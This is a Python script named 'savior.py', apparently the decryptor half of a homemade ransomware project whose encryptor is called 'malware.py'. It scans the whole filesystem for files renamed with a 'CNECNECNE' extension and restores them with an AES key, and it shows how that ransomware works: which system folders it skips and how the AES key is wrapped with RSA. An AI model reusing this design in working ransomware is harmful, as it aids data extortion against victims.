#!/bin/env python3

import os, sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

MALWARE = 'malware.py'
DECRYPTOR = 'savior.py'
KEY = 'key.key'
EXTENSION = 'CNECNECNE'

NOT_ENCRYPT =  {
    'win': ['C:\Windows', 'C:\Program Files', 'C:\Program Files (x86)', 'C:\ProgramData'],
    'linux': ['bin', 'boot', 'dev', 'etc', 'lib', 'lib32', 'lib64', 'proc', 'sbin', 'sys', 'usr', 'var', 'run', 'snap'],
    'macOS': ['/System', '/Library', '/bin', '/sbin'],
}

def remove_padding(msg):
    unpadder = PKCS7(128).unpadder()
    return unpadder.update(msg) + unpadder.finalize()

def decrypt_files(cipher, files):
    decrypted = 0
    for file in files:
        try:
            with open(file, 'rb') as f:
                data = f.read()
            decryptor = cipher.decryptor()
            data_padded = decryptor.update(data) + decryptor.finalize()
            plaintext = remove_padding(data_padded)
            with open(file, 'wb') as f:
                f.write(plaintext)
            os.rename(file, file[:-len(EXTENSION) - 1])
            decrypted += 1
        except:
            print(f"Error decrypting {file}")
    print(f"{decrypted} files have been decrypted")

def list_directory(operative_system):
    result = []

    root_dir = os.path.abspath(os.sep)

    for root, directories, files in os.walk(root_dir):
        if root == root_dir:
            for dir in directories:
                if dir in NOT_ENCRYPT[operative_system]:
                    directories.remove(dir)
                    continue

        for filename in files:
            absolute_path = os.path.join(root, filename)
            if os.path.isfile(absolute_path) and filename.endswith(EXTENSION):
                result.append(absolute_path)

    return result

def decrypt_keys(key):
    private_key = serialization.load_pem_private_key(
        key.encode(),
        password=None,
        backend=default_backend()
    )

    with open(KEY, 'rb') as key_file:
        content = key_file.read()
        data = private_key.decrypt(
            content,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        
        data = str(data, 'utf-8').split()
        if len(data) != 2:
            print('Something went wrong')
        key = bytes.fromhex(data[0])
        iv = bytes.fromhex(data[1])

    return (key, iv)

def crypto_setup(key, iv):
    key = bytes.fromhex(key)
    iv = bytes.fromhex(iv)

    cipher = Cipher(algorithm=algorithms.AES(key), mode=modes.CBC(iv), backend=default_backend())
    return cipher

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('USAGE: ./savior.py [KEY] [IV]')
        exit()

    files = list_directory('linux')
    key = sys.argv[1]
    iv = sys.argv[2]
    cipher = crypto_setup(key, iv)

    decrypt_files(cipher, files)
    with open('decrypt.log', 'w') as log_file:
        log_file.write('\n'.join(files))
